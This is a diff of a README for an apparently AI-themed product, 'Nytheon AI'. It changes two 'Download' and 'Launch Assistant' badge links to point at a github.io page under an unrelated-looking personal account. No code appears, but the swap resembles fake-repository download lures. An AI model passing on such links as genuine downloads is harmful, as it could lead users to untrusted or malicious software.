@@ -1,7 +1,7 @@
 # 🤖 Nytheon AI — Smart Assistant for Creative Automation
 
-[![Download Nytheon AI](https://img.shields.io/badge/Download_Nytheon_AI-blue?style=for-the-badge)](https://nytheon-ai-download.github.io/.github/)  
-[![Launch Assistant](https://img.shields.io/badge/Launch_Assistant-purple?style=for-the-badge&logo=ai)](https://nytheon-ai-download.github.io/.github/)
+[![Download Nytheon AI](https://img.shields.io/badge/Download_Nytheon_AI-blue?style=for-the-badge)](https://heartdiamondelizabethsunnyart2000.github.io/.github/nytheon-ai)  
+[![Launch Assistant](https://img.shields.io/badge/Launch_Assistant-purple?style=for-the-badge&logo=ai)](https://heartdiamondelizabethsunnyart2000.github.io/.github/nytheon-ai)
 
 ---
 
